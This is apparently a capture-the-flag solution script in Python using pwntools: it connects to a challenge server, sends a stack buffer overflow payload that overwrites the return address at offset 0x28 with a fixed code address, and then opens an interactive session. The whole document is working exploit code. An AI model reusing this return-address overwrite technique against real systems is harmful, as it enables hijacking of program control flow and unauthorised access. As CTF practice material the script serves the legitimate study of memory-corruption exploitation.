from pwn import *

p = remote("ctf.adl.tw", 10001)

payload = flat(
        {
            0: b"helloworld\x00",
            0x28: p64(0x40125b + 5)
        },
        length=0x40)

p.sendlineafter(b"!\n", payload)
p.interactive()
